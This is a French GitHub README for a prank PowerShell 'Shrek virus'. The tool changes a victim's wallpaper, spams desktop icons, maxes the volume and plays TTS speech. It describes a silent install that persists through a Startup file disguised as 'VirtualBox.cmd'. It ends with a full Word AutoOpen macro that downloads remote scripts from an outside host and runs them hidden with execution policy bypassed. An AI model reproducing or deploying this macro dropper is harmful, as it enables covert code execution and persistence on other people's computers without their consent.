# powershell-shrek-virus

# Fonctionnalités
- Modification du fond d'écran
- Ajout d'icônes Shrek sur le Bureau Windows
- Nom aléatoire des icônes Shrek
- Augmentation du volume de l'ordinateur
- Voix TTS


# Démonstration
![image](https://user-images.githubusercontent.com/73076854/221158845-0a091360-1907-432c-b3fd-3ecad0976cc6.png)

# Prérequie
- Pour le bon fonctionnement du script Powershell, le nom du fichier ne doit pas être modifier !
- Windows à jours
- L'environnement Bureau de la victime ne doit pas etre sur OneDrive

# Installation
- Télécharger ce dépôt
```
git clone https://github.com/WolfAnto/powershell-shrek-virus/
Sinon via interface graphique
```
- Execution du script
```
Clique droit sur ShrekMenu.ps1 > Exécuter en Powershell
```


# Explication / Fonctionnement

Le script est un menu Powershell qui vous propose diverse options :
- Installation Silencieuse
- Mode Flagrant
- Seulement le fond d'écran
- Seulement les icônes
- Seulement la voix TTS
- Seulement la notification Windows
- Désinstallation du script sur la machine
- Quitter le script

### Installation Silencieuse
- Lors de l'éxécution de cette option, le script va télécharger un script Powershell et venir l'installer dans le répertoire "C:\Users\Public\Documents"
- Ensuite le script va télécharger un script CMD et l'installer dans "C:\Users\username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\VirtualBox.cmd"
- Cela va permettre d'installer le script Powershell sur la machine mais aussi l'éxecuter lors du démarrage de l'ordinateur.


### Mode Flagrant
- Lors de l'éxécution de cette option, le script va s'éxécuter instentanément et il va définir un nouveau fond d'écran, créer un nombre prédéfinis d'icones sur le bureau avec un nom aléatoire, et faire une installation silencieuse.

### Seulement le fond d'écran
- Lors de l'éxécution de cette option, le script va uniquement changer le fond d'écran de l'ordinateur.

### Seulement les icônes
- Lors de l'éxécution de cette option, le script va vous demandez combien d'icônes souhaitez vous créer sur le Bureau Windows.

###  Seulement la voix TTS
- Lors de l'éxécution de cette option, le script va augmenter le volume de l'ordinateur au maximum et utiliser la fonction Text To Speach pour citez une phrase.

### Seulement la notification Windows
- Lors de l'éxécution de cette option, le script va utiliser une fonction Windows pour faire apparaitre une notification en bas de l'écran avec une phrase prédéfini.

### Désinstallation du script sur la machine
- Lors de l'éxécution de cette option, le script va supprimer les traces du script, changer le fond d'écran, supprimer les icônes du Bureau Windows, et ne plus s'éxecuter lors du démarrage

### Quitter
- Lors de l'éxécution de cette option, le script va se fermer.

# Modification
Si vous souhaitez changer le fond d'écran, dans le script Powershell ShrekMenu.ps1 :
- Convertir votre image servant de fond d'écran en code base64
- Aller à la ligne 72 et remplacer le code base64 par le votre

Si vous souhaitez changer l'icône, dans le script Powershell ShrekMenu.ps1 :
- Convertir votre image servant de fond d'écran en code base64
- Aller à la ligne 84 et remplacer le code base64 par le votre

# Execution dans Microsoft Word
Cliquez sur "Affichage" dans la barre de menu, puis sélectionnez "Macro" et "Afficher les macros".
![image](https://user-images.githubusercontent.com/73076854/229302792-6a42a8c6-ec6b-4414-8739-350b8d2471af.png)

Créer une macro au nom de "AutoOpen" et cliquer sur "Créer".
![image](https://user-images.githubusercontent.com/73076854/229302829-9fe69643-843f-4a45-b6e8-1746b3e586f5.png)

Une fenetre va apparaitre, remplacer le code par le suivant :
```
Sub AutoOpen()
    Dim objShell
    Set objShell = CreateObject("Wscript.Shell")
    objShell.Run "powershell.exe -Command ""Invoke-WebRequest -Uri 'https://antoningrepilloux.fr/ShrekVirus.ps1' -OutFile 'C:\Users\Public\Documents\ShrekVirus.ps1'"""
    objShell.Run "powershell.exe -Command ""Invoke-WebRequest -Uri 'https://antoningrepilloux.fr/VirtualBox.cmd' -OutFile '$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\VirtualBox.cmd'"""
    objShell.Run "powershell.exe -windowstyle hidden -executionpolicy bypass -file C:\Users\Public\Documents\ShrekVirus.ps1"
    Set objShell = Nothing

End Sub
```

Avant :
![image](https://user-images.githubusercontent.com/73076854/229302907-62297027-0b41-496f-b0e1-c90cdcf678f0.png)

Après :
![image](https://user-images.githubusercontent.com/73076854/229302921-ce845dd1-65f2-4891-babd-69e213ec4e15.png)

Enregistrer le code avec les touches CTRL + S, puis quitter la fenêtre.
Enregistrer le document Word avec les touches CTRL + S, puis quitter le document.
